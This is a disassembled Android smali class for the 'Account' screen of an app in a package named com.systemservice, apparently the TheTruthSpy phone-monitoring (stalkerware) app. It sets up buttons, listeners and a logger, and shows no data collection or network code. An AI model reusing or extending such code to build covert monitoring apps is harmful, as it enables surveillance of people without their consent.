.class public Lcom/systemservice/UIMainActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source ""


# instance fields
.field private q:Landroid/support/v7/widget/AppCompatButton;

.field private r:Lorg/apache/log4j/Logger;

.field private s:Landroid/widget/LinearLayout;

.field private t:Landroid/support/v7/widget/AppCompatButton;

.field private u:I


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lcom/systemservice/UIMainActivity;->u:I

    return-void
.end method

.method static synthetic a(Lcom/systemservice/UIMainActivity;I)I
    .locals 0

    iput p1, p0, Lcom/systemservice/UIMainActivity;->u:I

    return p1
.end method

.method static synthetic a(Lcom/systemservice/UIMainActivity;)Lorg/apache/log4j/Logger;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/UIMainActivity;->r:Lorg/apache/log4j/Logger;

    return-object p0
.end method

.method static synthetic b(Lcom/systemservice/UIMainActivity;)I
    .locals 0

    iget p0, p0, Lcom/systemservice/UIMainActivity;->u:I

    return p0
.end method

.method static synthetic c(Lcom/systemservice/UIMainActivity;)I
    .locals 2

    iget v0, p0, Lcom/systemservice/UIMainActivity;->u:I

    add-int/lit8 v1, v0, 0x1

    iput v1, p0, Lcom/systemservice/UIMainActivity;->u:I

    return v0
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    const p1, 0x7f0c0022

    invoke-virtual {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->setContentView(I)V

    const-string p1, "Account"

    invoke-virtual {p0, p1}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    const p1, 0x7f090131

    invoke-virtual {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/TextView;

    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v1, 0x0

    const-string v2, "TheTruthSpy"

    aput-object v2, v0, v1

    const v1, 0x7f0d0094

    invoke-virtual {p0, v1, v0}, Landroid/app/Activity;->getString(I[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const p1, 0x7f09002f

    invoke-virtual {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/support/v7/widget/AppCompatButton;

    iput-object p1, p0, Lcom/systemservice/UIMainActivity;->t:Landroid/support/v7/widget/AppCompatButton;

    const p1, 0x7f09008e

    invoke-virtual {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/LinearLayout;

    iput-object p1, p0, Lcom/systemservice/UIMainActivity;->s:Landroid/widget/LinearLayout;

    iget-object p1, p0, Lcom/systemservice/UIMainActivity;->t:Landroid/support/v7/widget/AppCompatButton;

    new-instance v0, Lcom/systemservice/g;

    invoke-direct {v0, p0}, Lcom/systemservice/g;-><init>(Lcom/systemservice/UIMainActivity;)V

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const-string p1, "UIMainActivity"

    invoke-static {p1}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object p1

    iput-object p1, p0, Lcom/systemservice/UIMainActivity;->r:Lorg/apache/log4j/Logger;

    const p1, 0x7f090030

    invoke-virtual {p0, p1}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/support/v7/widget/AppCompatButton;

    iput-object p1, p0, Lcom/systemservice/UIMainActivity;->q:Landroid/support/v7/widget/AppCompatButton;

    iget-object p1, p0, Lcom/systemservice/UIMainActivity;->q:Landroid/support/v7/widget/AppCompatButton;

    new-instance v0, Lcom/systemservice/h;

    invoke-direct {v0, p0}, Lcom/systemservice/h;-><init>(Lcom/systemservice/UIMainActivity;)V

    invoke-virtual {p1, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    iget-object p1, p0, Lcom/systemservice/UIMainActivity;->s:Landroid/widget/LinearLayout;

    new-instance v0, Lcom/systemservice/i;

    invoke-direct {v0, p0}, Lcom/systemservice/i;-><init>(Lcom/systemservice/UIMainActivity;)V

    invoke-virtual {p1, v0}, Landroid/widget/LinearLayout;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method
